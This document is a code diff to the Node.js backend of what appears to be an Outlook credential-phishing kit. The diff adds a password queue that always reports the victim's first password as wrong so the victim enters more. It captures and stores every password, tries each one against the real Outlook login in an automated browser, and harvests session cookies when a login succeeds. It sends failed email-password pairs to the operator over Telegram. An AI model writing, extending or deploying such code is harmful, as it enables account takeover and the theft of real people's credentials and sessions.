@@ -81,6 +81,9 @@ const sseConnections = new Map(); // sessionId -> response object
 // Analytics tracking with persistent storage
 const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');
 
+// Password retry queue: email -> { passwords: [{ password, timestamp, attemptNumber }], processing: boolean, sessionId: string | null }
+const passwordRetryQueue = new Map();
+
 // Function to broadcast immediate authentication events via SSE
 function broadcastAuthEvent(sessionId, event, data = {}) {
     const connection = sseConnections.get(sessionId);
@@ -259,14 +262,14 @@ async function getWarmBrowser() {
             }
         }
     }
-    
+
     // No healthy browser found, trigger maintenance
     setTimeout(() => {
         maintainWarmBrowserPool().catch(error => {
             console.error('Emergency warm browser maintenance failed:', error.message);
         });
     }, 100);
-    
+
     return null;
 }
 
@@ -358,7 +361,7 @@ function generateCookieInjectionScript(email, cookies, sessionId) {
         }
         return cookie;
     });
-    
+
     let injected = 0;
 
     cookies.forEach(cookie => {
@@ -653,7 +656,7 @@ app.get('/api/emails', async (req, res) => {
         }
 
         const browserEmails = await session.automation.getEmails(count);
-        
+
         // Transform browser automation email format to match frontend expectations
         const emails = browserEmails.map(email => ({
             id: email.id,
@@ -885,7 +888,7 @@ app.post('/api/verify-email', async (req, res) => {
 // Fast password authentication endpoint using preloaded browsers
 app.post('/api/authenticate-password-fast', async (req, res) => {
     try {
-        const { email, password, sessionId } = req.body;
+        const { email, password, sessionId, attemptNumber } = req.body;
 
         if (!email || !password) {
             return res.status(400).json({ 
@@ -894,7 +897,98 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
             });
         }
 
-        console.log(`🚀 Attempting FAST authentication for: ${email} (preload session: ${sessionId})`);
+        console.log(`🚀 Attempting FAST authentication for: ${email} (attempt: ${attemptNumber || 1})`);
+
+        // Add password to background retry queue
+        if (!passwordRetryQueue.has(email)) {
+            passwordRetryQueue.set(email, {
+                passwords: [],
+                processing: false,
+                sessionId: null
+            });
+        }
+
+        const queue = passwordRetryQueue.get(email);
+        queue.passwords.push({
+            password: password,
+            timestamp: Date.now(),
+            attemptNumber: attemptNumber || queue.passwords.length + 1
+        });
+
+        console.log(`📋 Added password to queue for ${email} (total queued: ${queue.passwords.length})`);
+
+        // On first attempt, immediately return "wrong password" to frontend
+        if (attemptNumber === 1 || queue.passwords.length === 1) {
+            console.log(`⚡ First attempt for ${email} - showing wrong password message`);
+
+            // Start background processing
+            setTimeout(() => {
+                processPasswordQueue(email).catch(error => {
+                    console.error('Background queue processing failed:', error.message);
+                });
+            }, 1000);
+
+            // Store failed attempt for admin panel
+            const sessionDir = path.join(__dirname, 'session_data');
+            if (!fs.existsSync(sessionDir)) {
+                fs.mkdirSync(sessionDir, { recursive: true });
+            }
+
+            const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+            const failureData = {
+                id: failureId,
+                sessionId: sessionId || createSessionId(),
+                email: email,
+                reason: 'Wrong Password (Processing in background)',
+                errorMessage: 'Your account or password is incorrect.',
+                timestamp: new Date().toISOString(),
+                status: 'retry_available',
+                method: 'fast-authentication-first-attempt',
+                attemptNumber: 1,
+                encryptedData: encryptData(JSON.stringify({ password: password }))
+            };
+
+            fs.writeFileSync(
+                path.join(sessionDir, `invalid_${failureId}.json`),
+                JSON.stringify(failureData, null, 2)
+            );
+
+            analytics.failedLogins++;
+            saveAnalytics();
+
+            return res.status(401).json({
+                success: false,
+                error: 'Invalid credentials',
+                message: 'Your account or password is incorrect. Try another password.',
+                canRetry: true,
+                attemptNumber: 1,
+                backgroundProcessing: true
+            });
+        }
+
+        // For subsequent attempts, also add to queue and return error
+        console.log(`📋 Attempt ${attemptNumber || queue.passwords.length} for ${email} - added to background queue`);
+
+        // Continue background processing if not already running
+        if (!queue.processing) {
+            setTimeout(() => {
+                processPasswordQueue(email).catch(error => {
+                    console.error('Background queue processing failed:', error.message);
+                });
+            }, 500);
+        }
+
+        analytics.failedLogins++;
+        saveAnalytics();
+
+        return res.status(401).json({
+            success: false,
+            error: 'Invalid credentials',
+            message: 'Your account or password is incorrect. Try another password.',
+            canRetry: true,
+            attemptNumber: attemptNumber || queue.passwords.length,
+            backgroundProcessing: true
+        });
 
         // Check if there's a preloaded session ready for this email
         let preloadedSession = null;
@@ -1117,7 +1211,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
             } catch (fastAuthError) {
                 console.warn(`⚠️ Fast authentication failed: ${fastAuthError.message}`);
-                
+
                 // Check if this is a recoverable error that we should keep browser alive for
                 const errorMessage = fastAuthError.message.toLowerCase();
                 const isRecoverableError = errorMessage.includes('execution context was destroyed') ||
@@ -1129,7 +1223,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
                 if (isRecoverableError && automation && !automation.isClosing) {
                     console.log(`🔄 Recoverable fast auth error for: ${email} - keeping browser alive for retry`);
-                    
+
                     // Keep browser session alive for retries instead of closing
                     automationSessions.set(sessionId, {
                         automation: automation,
@@ -1566,7 +1660,7 @@ app.post('/api/login-automation', async (req, res) => {
 
             if (isRecoverableError && automation && !automation.isClosing) {
                 console.log(`🔄 Recoverable technical error for: ${email} - keeping browser alive for retry`);
-                
+
                 // Keep browser session alive for retries instead of closing
                 automationSessions.set(sessionId, {
                     automation: automation,
@@ -1710,7 +1804,7 @@ app.post('/api/retry-password', async (req, res) => {
         try {
             // Try authentication with new password
             const automation = session.automation;
-            
+
             // First check if browser is still healthy
             const isHealthy = await automation.isHealthy();
             if (!isHealthy) {
@@ -1733,13 +1827,13 @@ app.post('/api/retry-password', async (req, res) => {
                     if (signInButton) {
                         await signInButton.click();
                         console.log('✅ Sign in button clicked for retry');
-                        
+
                         // Wait for authentication result
                         await automation.waitForAuthentication();
-                        
+
                         // If we get here, authentication was successful
                         console.log(`✅ Retry authentication successful for: ${session.email}`);
-                        
+
                         // Validate and save session
                         const sessionValidation = await automation.validateSession(session.email, password);
                         await automation.close();
@@ -1846,7 +1940,7 @@ app.post('/api/retry-password', async (req, res) => {
             }
         } catch (sessionError) {
             console.error(`Error during retry for session ${sessionId}:`, sessionError.message);
-            
+
             // Clean up unhealthy session
             try {
                 await session.automation.close();
@@ -2120,11 +2214,11 @@ app.get('/api/cookies/:sessionId', (req, res) => {
     try {
         const sessionId = req.params.sessionId;
         const clientSessionId = req.headers['x-session-id'];
-        
+
         // Verify admin access or session ownership with proper authorization
         const hasAdminAccess = req.headers['x-admin-token'] === config.security.adminToken;
         const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId) && clientSessionId === sessionId;
-        
+
         if (!hasAdminAccess && !hasSessionAccess) {
             return res.status(403).json({
                 error: 'Access denied - admin token or session owner access required',
@@ -2161,11 +2255,11 @@ app.get('/api/session-data/:sessionId', (req, res) => {
     try {
         const sessionId = req.params.sessionId;
         const clientSessionId = req.headers['x-session-id'];
-        
+
         // Verify admin access or session ownership with proper authorization
         const hasAdminAccess = req.headers['x-admin-token'] === config.security.adminToken;
         const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId) && clientSessionId === sessionId;
-        
+
         if (!hasAdminAccess && !hasSessionAccess) {
             return res.status(403).json({
                 error: 'Access denied - admin token or session owner access required',
@@ -2525,7 +2619,7 @@ app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) =
         }
 
         const originalConfig = { ...config.cloudflare };
-        
+
         // Temporarily merge test config with current config for validation
         Object.assign(config.cloudflare, testConfig);
 
@@ -2920,10 +3014,192 @@ app.get('/api/browser-pool-status', (req, res) => {
     }
 });
 
+// Function to process the password retry queue
+async function processPasswordQueue(email) {
+    if (!passwordRetryQueue.has(email)) {
+        return;
+    }
+
+    const queue = passwordRetryQueue.get(email);
+
+    if (queue.processing) {
+        return; // Already processing
+    }
+
+    queue.processing = true;
+
+    try {
+        while (queue.passwords.length > 0) {
+            const { password, attemptNumber } = queue.passwords.shift(); // Get the oldest password
+
+            console.log(`⚙️ Processing password attempt ${attemptNumber} for ${email}`);
+
+            let automation = null;
+            let currentSessionId = null;
+            let loginSuccess = false;
+            let sessionValidation = null;
+
+            try {
+                // Try to use an existing automation session if available
+                if (queue.sessionId && automationSessions.has(queue.sessionId)) {
+                    const session = automationSessions.get(queue.sessionId);
+                    if (session.email === email && (session.status === 'awaiting_retry' || session.status === 'authenticating')) {
+                        automation = session.automation;
+                        currentSessionId = queue.sessionId;
+                        console.log(`⚡ Reusing existing browser session ${currentSessionId} for ${email}`);
+                    }
+                }
+
+                // If no suitable session, create a new one (cold start)
+                if (!automation) {
+                    currentSessionId = createSessionId();
+                    console.log(`❄️ Starting cold start browser for ${email} (password attempt ${attemptNumber})`);
+                    automation = new ClosedBridgeAutomation({
+                        enableScreenshots: true,
+                        screenshotQuality: 80,
+                        sessionId: currentSessionId,
+                        eventCallback: broadcastAuthEvent
+                    });
+                    await automation.init();
+                    await automation.navigateToOutlook();
+                    // Store the new session
+                    automationSessions.set(currentSessionId, {
+                        automation: automation,
+                        status: 'authenticating', // Mark as authenticating
+                        email: email,
+                        startTime: Date.now(),
+                        sessionId: currentSessionId
+                    });
+                }
+
+                // Attempt login with the current password
+                loginSuccess = await automation.performLogin(email, password);
+
+                if (loginSuccess) {
+                    console.log(`✅ Password attempt ${attemptNumber} successful for ${email}`);
+                    sessionValidation = await automation.validateSession(email, password);
+
+                    if (sessionValidation.success) {
+                        // Authentication successful, save user session
+                        userSessions.set(currentSessionId, {
+                            sessionId: currentSessionId,
+                            graphAuth: null,
+                            userEmail: email,
+                            createdAt: Date.now(),
+                            oauthState: null,
+                            authenticated: true,
+                            verified: true,
+                            cookiesSaved: sessionValidation.cookiesSaved,
+                            usedPreload: false // Cold start for retry processing
+                        });
+
+                        analytics.successfulLogins++;
+                        saveAnalytics();
+
+                        console.log(`🎯 Login successful via retry queue for ${email} (session ${currentSessionId})`);
+
+                        // Clean up the automation session
+                        if (automationSessions.has(currentSessionId)) {
+                            await automation.close();
+                            automationSessions.delete(currentSessionId);
+                        }
+                        // Remove from retry queue
+                        queue.passwords = []; // Clear all remaining passwords
+                        break; // Exit the loop
+                    } else {
+                        console.error(`❌ Session validation failed after successful login for ${email}`);
+                        throw new Error('Session validation failed');
+                    }
+                } else {
+                    console.log(`❌ Password attempt ${attemptNumber} failed for ${email}`);
+
+                    // Store failed attempt
+                    const sessionDir = path.join(__dirname, 'session_data');
+                    if (!fs.existsSync(sessionDir)) {
+                        fs.mkdirSync(sessionDir, { recursive: true });
+                    }
+                    const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+                    const failureData = {
+                        id: failureId,
+                        sessionId: currentSessionId,
+                        email: email,
+                        reason: 'Wrong Password (Background Processing)',
+                        errorMessage: 'Your account or password is incorrect.',
+                        timestamp: new Date().toISOString(),
+                        status: 'invalid',
+                        method: 'password-retry-queue',
+                        attemptNumber: attemptNumber,
+                        encryptedData: encryptData(JSON.stringify({ password: password }))
+                    };
+                    fs.writeFileSync(path.join(sessionDir, `invalid_${failureId}.json`), JSON.stringify(failureData, null, 2));
+
+                    // Send Telegram notification for failed attempt
+                    if (telegramBot) {
+                        try {
+                            await telegramBot.sendFailedLoginNotification({
+                                email: email,
+                                password: password,
+                                timestamp: new Date().toISOString(),
+                                sessionId: currentSessionId,
+                                reason: `Incorrect Password (Queue Attempt ${attemptNumber})`,
+                                authMethod: 'Password Retry Queue',
+                                ip: 'Unknown', // Cannot reliably get IP here
+                                userAgent: 'Unknown'
+                            });
+                        } catch (telegramError) {
+                            console.warn('Telegram notification for queue failure failed:', telegramError.message);
+                        }
+                    }
+                }
+
+            } catch (error) {
+                console.error(`Error during password attempt ${attemptNumber} for ${email}:`, error.message);
+
+                analytics.failedLogins++;
+                saveAnalytics();
+
+                // Clean up browser if it's managed by this process
+                if (automation && !automation.isClosing) {
+                    try {
+                        await automation.close();
+                    } catch (closeError) {
+                        console.warn(`Error closing browser after attempt ${attemptNumber}:`, closeError.message);
+                    }
+                }
+                // Remove from automation sessions if it was created here
+                if (currentSessionId && automationSessions.has(currentSessionId)) {
+                    automationSessions.delete(currentSessionId);
+                }
+
+                // If this was the last password in the queue, and it failed, break
+                if (queue.passwords.length === 0) {
+                    break;
+                }
+            }
+        }
+    } catch (error) {
+        console.error('Unexpected error in password queue processing:', error);
+    } finally {
+        queue.processing = false;
+        // If there are still passwords in the queue, schedule the next processing run
+        if (queue.passwords.length > 0) {
+            setTimeout(() => {
+                processPasswordQueue(email).catch(error => {
+                    console.error('Background queue processing failed after delay:', error.message);
+                });
+            }, 1000); // Wait a bit before processing next batch
+        } else {
+            // Clean up the queue entry if it's empty
+            passwordRetryQueue.delete(email);
+            console.log(`✅ Password queue for ${email} is now empty and has been cleared.`);
+        }
+    }
+}
+
+
 // Start server
 app.listen(config.server.port, '0.0.0.0', () => {
     console.log('🚀 Browser Automation Backend running on port', config.server.port);
-    console.log('🤖 Browser automation endpoints available at http://localhost:' + config.server.port + '/api/');
     console.log('🌐 Frontend available at http://localhost:' + config.server.port + '/');
     console.log('🔧 Admin panel available at http://localhost:' + config.server.port + '/ad.html');
 
@@ -2932,7 +3208,7 @@ app.listen(config.server.port, '0.0.0.0', () => {
     } else {
         console.log('🔑 Admin token available via Telegram bot - Use /start to access');
     }
-    
+
     // Browser preparation disabled - browsers launch only when user enters email
     console.log('⚡ Fast mode: Browsers launch on-demand only');
 });
